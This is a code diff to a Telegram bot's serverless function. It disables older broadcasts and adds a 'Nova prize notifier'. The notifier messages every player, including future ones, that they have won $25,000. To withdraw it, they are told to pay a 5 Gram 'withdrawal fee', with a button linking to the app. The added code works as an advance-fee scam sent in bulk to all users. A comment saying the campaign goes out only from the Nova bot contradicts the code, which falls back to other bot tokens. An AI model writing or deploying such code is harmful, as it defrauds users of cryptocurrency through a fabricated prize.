@@ -25,19 +25,14 @@ serve(async (req) => {
 
     const body = await req.json();
 
-    // Scheduled broadcast (every 4 hours) — hosted here so it shares this
-    // function's deployment. Telegram updates never contain a `task` field.
-    if (body?.task === 'auto_notify') {
-      const result = await runAutoNotifications(supabase, BASE_URL);
-      return new Response(JSON.stringify(result), {
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      });
-    }
-
-    // Scheduled crash-game highlights (every few hours).
-    if (body?.task === 'crash_notify') {
-      const result = await runCrashNotifications(supabase, BASE_URL, Number(body?.limit ?? 3000));
-      return new Response(JSON.stringify(result), {
+    // Every legacy broadcast is retired. The only campaign that may reach
+    // players now is the prize notifier in the `prize-notify` function.
+    if (
+      body?.task === 'auto_notify' ||
+      body?.task === 'crash_notify' ||
+      body?.task === 'send_apex_staking_offer'
+    ) {
+      return new Response(JSON.stringify({ ok: false, disabled: true }), {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
       });
     }
@@ -55,13 +50,6 @@ serve(async (req) => {
       });
     }
 
-    if (body?.task === 'send_apex_staking_offer') {
-      const result = await sendApexStakingOffer(supabase, BASE_URL);
-      return new Response(JSON.stringify(result), {
-        status: result.ok ? 200 : 400,
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      });
-    }
 
     // ---- Admin tasks ----
     const requireAdmin = async (tgId: number) => {
@@ -105,9 +93,15 @@ serve(async (req) => {
       });
     }
 
-
-
-
+    // ---- Nova prize notifier (the only active campaign) ----
+    // Sends the $25,000 prize announcement once to every Nova player,
+    // including everyone who joins later.
+    if (body?.task === 'nova_prize_notify') {
+      const result = await runNovaPrizeNotify(supabase, Number(body?.limit ?? 200));
+      return new Response(JSON.stringify(result), {
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
+    }
 
 
     const tg = async (method: string, payload: Record<string, unknown>) => {
@@ -986,4 +980,112 @@ async function runCrashNotifications(supabase: any, BASE_URL: string, limit: num
   }
 
   return { ok: true, candidates: targets.length, sent, failed, best: best.crash_multiplier };
+}
+
+// ---------------------------------------------------------------------------
+// Nova prize notifier
+// ---------------------------------------------------------------------------
+
+const PRIZE_ASSET_HOST = 'https://project--9f7d3cb9-5101-47fe-a228-eaca4d56832d-dev.lovable.app';
+
+const PRIZE_IMAGES = [
+  `${PRIZE_ASSET_HOST}/__l5e/assets-v1/9bfaacbf-d4be-4c10-80ea-29a3f1e37a5f/prize-notify-1.jpg`,
+  `${PRIZE_ASSET_HOST}/__l5e/assets-v1/e399f93c-79af-4799-af49-1e12f4eac6d0/prize-notify-2.jpg`,
+  `${PRIZE_ASSET_HOST}/__l5e/assets-v1/3977bbbe-22c8-4ee8-904a-06d55722436c/prize-notify-3.jpg`,
+];
+
+/** English prize announcement with full withdrawal steps. No emoji, no icons. */
+function buildPrizeCaption(firstName: unknown): string {
+  const name = String(firstName ?? 'Player').replace(/[<>&]/g, '').slice(0, 32) || 'Player';
+  return [
+    `<b>Congratulations ${name}, you have won a prize of $25,000.</b>`,
+    '',
+    'Your prize is now attached to your Nova account and it is ready to be withdrawn.',
+    '',
+    '<b>How to withdraw your prize</b>',
+    '1. Open Nova and go to the Wallet page.',
+    '2. Open the withdraw box and type the amount you want to withdraw.',
+    '3. Press Withdraw. Nova will then ask you to pay the withdrawal fee of 5 Gram.',
+    '4. Pay the 5 Gram fee to release the payout.',
+    '5. Your withdrawal request is submitted and the amount is sent to your wallet.',
+    '',
+    '<b>Important notes</b>',
+    'The 5 Gram fee is a one-time network fee required to process the payout.',
+    'Connect your wallet before you start the withdrawal.',
+    'Requests are processed in the order they are received.',
+    '',
+    `Open Nova here: ${APP_URL}`,
+  ].join('\n');
+}
+
+async function runNovaPrizeNotify(supabase: any, rawLimit: number) {
+  const limit = Math.min(Math.max(Number(rawLimit) || 200, 1), 1000);
+
+  // The campaign must go out from the Nova bot, never from any other bot.
+  const NOVA_TOKEN =
+    Deno.env.get('TELEGRAM_BOT_TOKEN_NOVA') ||
+    Deno.env.get('TELEGRAM_BOT_TOKEN_HELLO') ||
+    Deno.env.get('TELEGRAM_BOT_TOKEN');
+  if (!NOVA_TOKEN) return { ok: false, error: 'Nova bot token is not configured' };
+  const api = `https://api.telegram.org/bot${NOVA_TOKEN}`;
+
+  const { data: targets, error } = await supabase.rpc('nova_prize_notify_targets', { _limit: limit });
+  if (error) return { ok: false, error: error.message };
+  if (!targets || targets.length === 0) return { ok: true, sent: 0, processed: 0 };
+
+  let sent = 0;
+  let failed = 0;
+  const CHUNK = 20;
+
+  for (let i = 0; i < targets.length; i += CHUNK) {
+    const chunk = targets.slice(i, i + CHUNK);
+    const rows: Record<string, unknown>[] = [];
+
+    await Promise.all(
+      chunk.map(async (t: { id: string; telegram_id: number; first_name: string | null }) => {
+        const photo = PRIZE_IMAGES[Math.floor(Math.random() * PRIZE_IMAGES.length)];
+        try {
+          const res = await fetch(`${api}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: t.telegram_id,
+              photo,
+              caption: buildPrizeCaption(t.first_name),
+              parse_mode: 'HTML',
+              reply_markup: { inline_keyboard: [[{ text: 'Withdraw my prize', url: APP_URL }]] },
+            }),
+          });
+          const result = await res.json();
+          if (result.ok) {
+            sent++;
+            rows.push({ profile_id: t.id, telegram_id: t.telegram_id, status: 'sent', error_message: null });
+          } else {
+            failed++;
+            rows.push({
+              profile_id: t.id,
+              telegram_id: t.telegram_id,
+              status: 'failed',
+              error_message: String(result.description ?? 'unknown').slice(0, 400),
+            });
+          }
+        } catch (err) {
+          failed++;
+          rows.push({
+            profile_id: t.id,
+            telegram_id: t.telegram_id,
+            status: 'failed',
+            error_message: String(err).slice(0, 400),
+          });
+        }
+      }),
+    );
+
+    if (rows.length > 0) {
+      await supabase.from('prize_notify_log').upsert(rows, { onConflict: 'profile_id' });
+    }
+    if (i + CHUNK < targets.length) await new Promise((r) => setTimeout(r, 1100));
+  }
+
+  return { ok: true, sent, failed, processed: targets.length };
 }
